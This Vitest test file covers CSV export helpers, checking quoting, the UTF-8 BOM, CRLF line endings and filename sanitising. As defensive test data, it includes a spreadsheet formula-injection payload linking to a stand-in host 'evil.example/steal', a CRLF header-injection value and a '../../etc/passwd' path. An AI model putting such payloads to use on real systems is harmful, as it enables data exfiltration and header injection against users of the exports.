import { describe, expect, it } from 'vitest';

import { csvCell, safeFilename, toCsv, UTF8_BOM } from '../csv';

describe('csvCell', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvCell('Install the ONT')).toBe('Install the ONT');
    expect(csvCell(42)).toBe('42');
  });

  it('renders null and undefined as empty, not as the words', () => {
    // "null" in a spreadsheet cell is a value someone will filter on by mistake.
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it.each([
    ['a,b', '"a,b"'],
    ['say "hi"', '"say ""hi"""'],
    ['line1\nline2', '"line1\nline2"'],
    ['carriage\rreturn', '"carriage\rreturn"'],
  ])('quotes %j', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  describe('formula injection', () => {
    // Excel, LibreOffice and Sheets evaluate a cell beginning with these. The export
    // carries free text written by other people, so the content is not ours to trust.
    it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx'])(
      'neutralises a leading %j',
      (input) => {
        expect(csvCell(input).replace(/^"/, '').startsWith("'")).toBe(true);
      },
    );

    it('neutralises the classic HYPERLINK payload', () => {
      const attack = '=HYPERLINK("http://evil.example/steal","Click me")';
      const cell = csvCell(attack);
      // Quoted because it contains commas and quotes — and prefixed INSIDE the quoting,
      // because the quotes are CSV syntax and are gone by the time a sheet parses it.
      expect(cell.startsWith(`"'=HYPERLINK`)).toBe(true);
    });

    it('does not mangle a value that merely contains an equals sign', () => {
      expect(csvCell('ratio a=b')).toBe('ratio a=b');
    });

    it('still quotes a neutralised value that also needs quoting', () => {
      expect(csvCell('=a,b')).toBe(`"'=a,b"`);
    });
  });

  it('serialises a Date as ISO rather than a locale string', () => {
    expect(csvCell(new Date(Date.UTC(2026, 6, 15, 9, 30)))).toBe('2026-07-15T09:30:00.000Z');
  });

  it('serialises an object as JSON rather than [object Object]', () => {
    expect(csvCell({ a: 1 })).toBe('"{""a"":1}"');
  });
});

describe('toCsv', () => {
  const rows = [
    { name: 'Alice', note: 'said "yes", loudly' },
    { name: 'Bob', note: null },
  ];
  const columns = [
    { header: 'Name', value: (r: (typeof rows)[number]) => r.name },
    { header: 'Note', value: (r: (typeof rows)[number]) => r.note },
  ];

  it('writes a header row followed by the data', () => {
    const csv = toCsv(rows, columns);
    const lines = csv.replace(UTF8_BOM, '').trimEnd().split('\r\n');
    expect(lines[0]).toBe('Name,Note');
    expect(lines[1]).toBe('Alice,"said ""yes"", loudly"');
    expect(lines[2]).toBe('Bob,');
  });

  it('starts with a UTF-8 BOM so Excel does not mojibake non-ASCII names', () => {
    expect(toCsv(rows, columns).startsWith(UTF8_BOM)).toBe(true);
  });

  it('uses CRLF line endings', () => {
    const csv = toCsv(rows, columns);
    expect(csv).toContain('\r\n');
    // No bare LF outside the quoted fields — this fixture has none.
    expect(csv.replace(/\r\n/g, '')).not.toContain('\n');
  });

  it('emits only a header for an empty result rather than nothing at all', () => {
    // An empty file reads as a failed download; a header row reads as "no matching rows".
    const csv = toCsv([], columns).replace(UTF8_BOM, '');
    expect(csv).toBe('Name,Note\r\n');
  });
});

describe('safeFilename', () => {
  it('keeps a readable stem', () => {
    expect(safeFilename('action-items', '2026-07-15')).toBe('action-items-2026-07-15.csv');
  });

  it('strips characters that would break out of a Content-Disposition header', () => {
    // A quote or newline here could inject another header.
    const name = safeFilename('rep"ort\r\nX-Evil: 1', '2026-07-15');
    expect(name).not.toContain('"');
    expect(name).not.toContain('\r');
    expect(name).not.toContain('\n');
  });

  it('strips path separators', () => {
    expect(safeFilename('../../etc/passwd', '2026-07-15')).not.toContain('/');
  });

  it('falls back rather than producing a nameless file', () => {
    expect(safeFilename('///', '2026-07-15')).toBe('export-2026-07-15.csv');
  });
});
